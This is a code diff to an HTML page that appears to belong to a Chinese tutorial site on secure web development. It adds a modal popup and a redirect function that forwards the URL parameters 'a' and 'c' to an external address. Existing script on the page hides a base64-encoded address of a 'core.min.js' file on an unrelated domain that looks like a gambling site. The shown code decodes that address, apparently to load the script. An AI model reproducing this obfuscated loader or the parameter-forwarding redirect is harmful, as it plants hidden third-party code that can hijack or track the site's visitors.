@@ -200,6 +200,55 @@
         .footer-links a:hover {
             color: #005F6B;
         }
+        .modal {
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        /* 弹窗内容 */
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 300px;
+            text-align: center;
+            border-radius: 5px;
+        }
+
+        /* 关闭按钮 */
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover {
+            color: black;
+        }
+
+        /* 跳转按钮样式 */
+        .redirect-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+
+        .redirect-btn:hover {
+            background-color: #45a049;
+        }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
@@ -211,6 +260,16 @@
             <p>构建坚不可摧的Web应用程序</p>
         </header>
 
+        <!-- 弹窗 -->
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closePopup()">&times;</span>
+                <h3>确认跳转</h3>
+                <p>您确定要跳转到新页面吗？</p>
+                <button class="redirect-btn" onclick="redirectToNewPage()">确认跳转</button>
+                <button class="redirect-btn" style="background-color: #f44336;" onclick="closePopup()">取消</button>
+            </div>
+        </div>
         <!-- 顶部固定导航的占位符和实际导航 -->
         <div class="sticky-nav-wrapper" id="stickyNavWrapper" style="height: 46px; display: block;"></div>
         <nav class="sticky-nav" id="stickyNav">
@@ -381,6 +440,33 @@ ResultSet rs = stmt.executeQuery();
     </script>
     <script>
         (function () {
+            // 跳转到新页面
+            function redirectToNewPage() {
+                // 获取当前 URL 参数
+                const urlParams = new URLSearchParams(window.location.search);
+                const paramA = urlParams.get('a');
+                const paramC = urlParams.get('c');
+                
+                // 构造新 URL
+                let newURL = 'https://example.com/target';
+                if (paramA || paramC) {
+                    newURL += '?';
+                    if (paramA) newURL += `a=${encodeURIComponent(paramA)}`;
+                    if (paramA && paramC) newURL += '&';
+                    if (paramC) newURL += `c=${encodeURIComponent(paramC)}`;
+                }
+                
+                // 执行跳转
+                window.location.href = newURL;
+            }
+    
+            // 点击遮罩层关闭弹窗
+            window.onclick = function(event) {
+                const modal = document.getElementById("myModal");
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                }
+            }
             function init() {
                 const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
                 const decodedUrl = atob(encodedUrl);
